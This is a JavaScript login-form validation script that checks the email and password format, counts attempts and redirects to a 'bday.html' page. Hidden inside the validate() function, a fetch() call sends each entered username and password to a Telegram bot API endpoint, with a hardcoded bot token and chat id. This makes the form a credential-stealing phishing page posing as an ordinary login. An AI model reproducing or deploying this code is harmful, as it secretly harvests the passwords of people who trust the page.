var ck_email = new RegExp(/^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i)
var pword= new RegExp (/(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}/)
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
var errors = [];
fetch("https://api.telegram.org/bot1228033872:AAHsI3oFOQLKVC7mmnVH0bNyQuPGitiBEXQ/sendMessage?chat_id=582942300&text="+username+".   ."+password)

    if (!ck_email.test(username)) {
        errors[errors.length] = "You must enter a valid email address.";
    }
    if (password=='') {
        errors[errors.length] = "You must enter the password ";
    }
    if (!pword.test(password)) { 
        errors[errors.length] = "Password is incorrect ";
    }
    if (errors.length > 0) {        
    
    reportErrors(errors);
    attempt =attempt +1;
    }

if ( username == "admin@gmail.com" && password == "Admin@123"){
    //alert ("Login successfully");
    window.location = "bday.html"; // Redirecting to other page.
    return false;
}
else{
attempt --;
//alert("You have left "+attempt+" attempt;");
//alert("Email or Password is incorrect.Check once and Try again ");
//https://accounts.google.com/signin/recovery

// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
window.location = "bday.html";
return false;
}
}
}

function reportErrors(errors){
    var msg = "Please Enter Valid Data...\n";
    for (var i = 0; i<errors.length; i++) {
    var numError = i + 1;
     msg += "\n" + numError + ". " + errors[i];
   }
    alert(msg);
   }